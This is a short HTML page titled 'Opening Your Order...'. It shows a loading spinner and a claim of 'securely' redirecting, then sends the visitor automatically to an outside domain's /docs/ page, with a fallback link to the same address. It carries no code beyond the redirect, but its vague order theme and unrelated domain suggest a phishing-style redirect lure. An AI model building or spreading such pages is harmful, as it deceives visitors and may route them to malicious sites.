<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Opening Your Order...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Auto redirect after 3 seconds -->
<meta http-equiv="refresh" content="3;url=https://paradisecaycuma.com/docs/index.html">

<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f4f6f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .box {
    background: #fff;
    padding: 40px;
    border-radius: 10px;
    text-align: center;
    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
    max-width: 400px;
  }

  h2 {
    margin-bottom: 15px;
  }

  p {
    color: #666;
    font-size: 14px;
  }

  .loader {
    margin: 20px auto;
    border: 4px solid #eee;
    border-top: 4px solid #7c4dff;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    100% { transform: rotate(360deg); }
  }

  a {
    display: inline-block;
    margin-top: 15px;
    color: #7c4dff;
    text-decoration: none;
    font-weight: bold;
  }
</style>
</head>

<body>

<div class="box">
  <h2>Opening Your Order...</h2>
  <div class="loader"></div>
  <p>Please wait while we securely redirect you.</p>

  <p>If nothing happens, click below:</p>
  <a href="https://paradisecaycuma.com/docs/index.html">
    Continue to your order
  </a>
</div>

</body>
</html>
